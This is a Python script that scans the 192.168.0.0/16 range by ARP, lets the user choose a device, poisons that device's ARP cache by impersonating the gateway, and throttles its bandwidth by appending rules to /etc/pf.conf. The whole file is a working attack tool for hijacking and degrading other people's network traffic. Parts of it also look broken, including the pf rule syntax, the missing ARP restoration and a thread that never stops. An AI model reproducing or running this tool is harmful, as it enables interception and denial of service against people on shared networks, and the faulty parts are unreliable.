import os
import time
from scapy.all import ARP, Ether, srp, send
from threading import Thread


# Step 1: Network Scanner
def scan_subnet(subnet):
    """Scans a single subnet."""
    print(f"Scanning subnet {subnet}...")
    arp_request = ARP(pdst=subnet)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast MAC address
    packet = broadcast / arp_request
    answered = srp(packet, timeout=2, verbose=False)[0]

    devices = [{'ip': received.psrc, 'mac': received.hwsrc} for sent, received in answered]
    return devices


def scan_all_subnets():
    """Scans all subnets (192.168.0.0/16) using threading."""
    threads = []
    results = []
    
    def thread_worker(subnet):
        results.extend(scan_subnet(subnet))

    for i in range(256):  # Iterate over 192.168.0.0 to 192.168.255.255
        subnet = f"192.168.{i}.0/24"
        thread = Thread(target=thread_worker, args=(subnet,))
        threads.append(thread)
        thread.start()

    # Wait for all threads to complete
    for thread in threads:
        thread.join()
    
    return results


# Step 2: ARP Spoofing
def arp_spoof(target_ip, gateway_ip, target_mac):
    print(f"Starting ARP spoofing: Target {target_ip} via {gateway_ip}")
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, op=2)

    try:
        while True:
            send(arp_response, verbose=False)  # Send the forged ARP response
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nARP spoofing stopped.")


# Step 3: Bandwidth Limiting
def create_pf_rule(target_ip, bandwidth_limit="100Kb"):
    print(f"Setting bandwidth limit for {target_ip}: {bandwidth_limit}")
    rule = f"""
altq on en0 bandwidth {bandwidth_limit} queue {target_ip}
pass out on en0 to {target_ip} keep state queue {target_ip}
"""
    pf_conf = "/etc/pf.conf"

    # Backup original PF configuration
    os.system(f"sudo cp {pf_conf} {pf_conf}.backup")

    # Add the new bandwidth limiting rule to the PF configuration
    with open(pf_conf, "a") as f:
        f.write("\n" + rule)

    # Load and apply the new PF configuration
    os.system("sudo pfctl -f /etc/pf.conf")
    os.system("sudo pfctl -e")


# Step 4: Main Integration
def main():
    # Network scanning
    print("Scanning all subnets in the range 192.168.0.0/16...")
    devices = scan_all_subnets()

    if not devices:
        print("No devices found on the network.")
        return

    print("\nDiscovered devices:")
    for i, device in enumerate(devices):
        print(f"{i + 1}. IP: {device['ip']}, MAC: {device['mac']}")

    # Select target device
    target_index = int(input("\nSelect a target (e.g., 1): ")) - 1
    if target_index < 0 or target_index >= len(devices):
        print("Invalid target selection.")
        return

    target = devices[target_index]
    target_ip = target['ip']
    target_mac = target['mac']

    gateway_ip = input("Enter the gateway IP (e.g., 192.168.1.1): ")
    bandwidth_limit = input("Enter bandwidth limit (e.g., 100Kb, 1Mb): ")

    # Start ARP spoofing in a separate thread
    spoof_thread = Thread(target=arp_spoof, args=(target_ip, gateway_ip, target_mac))
    spoof_thread.start()

    # Apply bandwidth limiting
    create_pf_rule(target_ip, bandwidth_limit)

    # Wait for the user to stop the script
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping tool...")
        os.system("sudo pfctl -d")  # Disable pf
        spoof_thread.join()  # Wait for the ARP spoofing thread to finish


if __name__ == "__main__":
    main()
